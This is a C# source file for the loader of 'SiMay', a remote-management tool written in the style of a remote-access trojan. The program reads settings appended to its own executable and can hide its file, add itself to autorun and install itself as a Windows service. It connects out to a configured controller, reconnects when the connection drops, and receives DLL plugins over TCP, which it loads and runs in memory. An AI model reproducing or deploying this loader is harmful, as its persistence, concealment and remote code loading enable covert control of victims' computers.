using SiMay.Basic;
using SiMay.Platform.Windows;
using SiMay.Serialize.Standard;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp.Session;
using SiMay.Sockets.Tcp.TcpConfiguration;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SiMay.RemoteService.Loader
{
    class Program
    {

        /// <summary>
        /// 服务启动参数
        /// </summary>
        private const string SERVICE_START = "-serviceStart";

        /// <summary>
        /// SYSTEM用户进程启动参数
        /// </summary>
        private const string SERVICE_USER_START = "-user";

        /// <summary>
        /// 表示ACK命令
        /// </summary>
        private const short C_GLOBAL_CONNECT = 1000;

        /// <summary>
        /// 插件数据
        /// </summary>
        private const short S_GLOBAL_PLUGIN = 2;

        /// <summary>
        /// 主服务连接类型
        /// </summary>
        private const byte MAIN_CONNECT = 0;

        /// <summary>
        /// 服务工作连接类型
        /// </summary>
        private const byte WORK_CONNECT = 1;

        /// <summary>
        /// 主核心库文件名
        /// </summary>
        private const string MAIN_PLUGIN_COMNAME = "SiMayService.Core.dll";


        private static bool _systemPermission;
        private static IPEndPoint _ipendPoint;
        private static StartParameter _startParameter;
        private static IAppMainService _appMainService;
        private static TcpSocketSaeaClientAgent _clientAgent;
        private static Dictionary<string, byte[]> _pluginCOMs = new Dictionary<string, byte[]>();
        static void Main(string[] args)
        {
            if (args.Any(c => c.Equals(SERVICE_START, StringComparison.OrdinalIgnoreCase)))
            {
                ServiceBase.Run(new ServiceBase[]
                {
                    new Service()
                });
            }
            else//非服务启动
            {
                _startParameter = new StartParameter()
                {
                    Host = "127.0.0.1",
                    Port = 5200,
                    GroupName = "默认分组",
                    RemarkInformation = "SiMayService远程管理",
                    IsHide = false,
                    IsMutex = false,
                    IsAutoStart = false,
                    SessionMode = 0,
                    AccessKey = 5200,
                    ServiceVersion = "正式5.0",
                    RunTimeText = DateTime.Now.ToString(),
                    UniqueId = "AAAAAAAAAAAAAAA11111111"
                };
                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
                var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
                if (sign == 9999)
                {
                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
                    byte[] bytes = new byte[length];
                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);

                    var options = PacketSerializeHelper.DeserializePacket<Core.Entitys.ServiceOptions>(bytes);
                    _startParameter.Host = options.Host;
                    _startParameter.Port = options.Port;
                    _startParameter.RemarkInformation = options.Remark;
                    _startParameter.IsAutoStart = options.IsAutoRun;
                    _startParameter.IsHide = options.IsHide;
                    _startParameter.AccessKey = options.AccessKey;
                    _startParameter.SessionMode = options.SessionMode;
                    _startParameter.UniqueId = options.Id + $"_{Environment.MachineName}";
                    _startParameter.IsMutex = options.IsMutex;
                    _startParameter.GroupName = options.GroupName;
                    _startParameter.InstallService = options.InstallService;
                    _startParameter.ServiceName = options.ServiceName;
                    _startParameter.ServiceDisplayName = options.ServiceDisplayName;
                }

                if (_startParameter.IsMutex)
                {
                    //进程互斥体
                    Mutex MyMutex = new Mutex(true, $"{_startParameter.UniqueId}_SiMayService", out var bExist);
                    if (!bExist)
                        Environment.Exit(0);
                }

                //是否服务安装
                _systemPermission = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));

                if (_startParameter.IsHide)
                    SystemSessionHelper.FileHide(true);

                if (_startParameter.IsAutoStart)
                    SystemSessionHelper.SetAutoRun(true);

                if (args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
                    new UserTrunkContext(args);

                //非SYSTEM用户进程启动则进入安装服务
                if (_startParameter.InstallService && !args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
                    SystemSessionHelper.InstallAutoStartService(_startParameter.ServiceName, _startParameter.ServiceDisplayName);

                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
                Application.ThreadException += Application_ThreadException;

                AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
                AppDomain.CurrentDomain.AssemblyResolve += (s, p) =>
                {
                    var key = p.Name.Split(',')[0] + ".dll";
                    var assembly = Assembly.Load(_pluginCOMs[key]);
                    _pluginCOMs.Remove(key);
                    return assembly;
                };

                var clientConfig = new TcpSocketSaeaClientConfiguration();
                if (_startParameter.SessionMode == 0)
                {
                    //服务版配置
                    clientConfig.AppKeepAlive = true;
                    clientConfig.KeepAlive = false;
                }
                else
                {
                    //中间服务器版服务端配置
                    clientConfig.AppKeepAlive = false;
                    clientConfig.KeepAlive = true;
                }
                clientConfig.CompressTransferFromPacket = false;
                clientConfig.KeepAliveInterval = 5000;
                clientConfig.KeepAliveSpanTime = 1000;

                _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, (notify, session) =>
                {
                    //如果服务已加载，转交消息核心程序
                    if (!_appMainService.IsNull())
                    {
                        _appMainService.Notify(notify, session);
                        return;
                    }

                    switch (notify)
                    {
                        case TcpSessionNotify.OnConnected:

                            var ackData = BuilderAckPacket(_startParameter.AccessKey, MAIN_CONNECT);//构造ACK数据包
                            var carryAccessIdData = WrapAccessId(ackData, 0);//构造带AccessId信息的数据包
                            session.SendAsync(carryAccessIdData);
                            break;
                        case TcpSessionNotify.OnSend:
                            break;
                        case TcpSessionNotify.OnDataReceiveing:
                            break;
                        case TcpSessionNotify.OnDataReceived:

                            var packBody = TakeHeadAndMessage(session);
                            var headInt = BitConverter.ToInt16(packBody, 0);
                            switch (headInt)
                            {
                                case S_GLOBAL_PLUGIN:
                                    AnalysisLoadAssemblyCOM(session, GetMessagePayload(packBody));
                                    break;
                                default:
                                    break;
                            }
                            break;
                        case TcpSessionNotify.OnClosed:

                            System.Timers.Timer resetTimer = new System.Timers.Timer();
                            resetTimer.Interval = 5000;
                            resetTimer.Elapsed += (s, e) =>
                            {
                                //主连接重连
                                ConnectToServer();

                                resetTimer.Stop();
                                resetTimer.Dispose();
                            };
                            resetTimer.Start();
                            break;
                        default:
                            break;
                    }
                });
                while (true) //第一次解析域名,直至解析成功
                {
                    var ip = GetHostByName(_startParameter.Host);
                    if (ip != null)
                    {
                        _ipendPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
                        break;
                    }

                    Console.WriteLine(_startParameter.Host ?? "address analysis is null");

                    Thread.Sleep(5000);
                }
                ConnectToServer();

                Application.Run();
            }
        }


        private static void ConnectToServer()
        {
            ThreadPool.QueueUserWorkItem(x =>
            {
                var ip = GetHostByName(_startParameter.Host);//尝试解析域名
                if (ip == null)
                    return;
                _ipendPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
            });
            _clientAgent.ConnectToServer(_ipendPoint);
        }

        private static byte[] GetMessagePayload(byte[] data)
        {
            byte[] payload = new byte[data.Length - sizeof(short)];
            Array.Copy(data, sizeof(short), payload, 0, payload.Length);
            return payload;

        }
        private static byte[] TakeHeadAndMessage(TcpSocketSaeaSession session)
        {
            var bytes = session.CompletedBuffer.Copy(sizeof(long), session.CompletedBuffer.Length - sizeof(long));
            return GZipHelper.Decompress(bytes);
        }

        private static byte[] WrapAccessId(byte[] data, long accessId)
        {
            var accessIdBytes = BitConverter.GetBytes(accessId);
            var byteBuilder = new List<byte>();
            byteBuilder.AddRange(accessIdBytes);
            byteBuilder.AddRange(GZipHelper.Compress(data, 0, data.Length));
            return byteBuilder.ToArray();
        }

        /// <summary>
        /// 构造确认包，通知主控端未载入核心库
        /// </summary>
        /// <param name="accessKey"></param>
        /// <param name="type"></param>
        /// <returns></returns>
        private static byte[] BuilderAckPacket(long accessKey, byte type)
        {
            var headCommand = BitConverter.GetBytes(C_GLOBAL_CONNECT);
            var emptyLong = new byte[8];
            var byteBuilder = new List<byte>();
            byteBuilder.AddRange(headCommand);
            byteBuilder.Add(type);
            byteBuilder.AddRange(emptyLong);
            byteBuilder.AddRange(BitConverter.GetBytes(accessKey));
            byteBuilder.Add(0);//未载入核心库
            return byteBuilder.ToArray();
        }

        private static void AnalysisLoadAssemblyCOM(TcpSocketSaeaSession session, byte[] data)
        {
            int position = 0;
            var byteLst = new List<byte>(data);

            byte[] countBytes = byteLst.GetRange(position, sizeof(int)).ToArray();
            int count = BitConverter.ToInt32(countBytes, 0);

            position += sizeof(int);
            while (position < byteLst.Count)
            {
                int len = BitConverter.ToInt32(byteLst.GetRange(position, sizeof(int)).ToArray(), 0);
                position += sizeof(int);
                string name = Encoding.Unicode.GetString(byteLst.GetRange(position, len).ToArray(), 0, len);
                position += len;
                int fileLenght = BitConverter.ToInt32(byteLst.GetRange(position, sizeof(int)).ToArray(), 0);
                position += sizeof(int);
                byte[] file = byteLst.GetRange(position, fileLenght).ToArray();
                position += fileLenght;
                _pluginCOMs.Add(name, file);
            }

            if (_pluginCOMs.ContainsKey(MAIN_PLUGIN_COMNAME))
            {
                var assembly = Assembly.Load(_pluginCOMs[MAIN_PLUGIN_COMNAME]);
                var mainType = assembly.GetTypes().Where(c => typeof(IAppMainService).IsAssignableFrom(c)).FirstOrDefault();
                if (mainType == null)
                    return;

                _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _ipendPoint, _systemPermission) as IAppMainService;
            }
        }
        public static string GetHostByName(string host)
        {
            string _return = null;
            try
            {
                IPHostEntry hostinfo = Dns.GetHostByName(host);
                IPAddress[] aryIP = hostinfo.AddressList;
                _return = aryIP[0].ToString();
            }
            catch { }

            return _return;
        }

        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            //CommonHelper.WriteText(e.Exception, Path.Combine(Environment.CurrentDirectory, LOG_FILENAME));
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            //CommonHelper.WriteText(e.ExceptionObject as Exception, Path.Combine(Environment.CurrentDirectory, LOG_FILENAME));
        }
    }
}
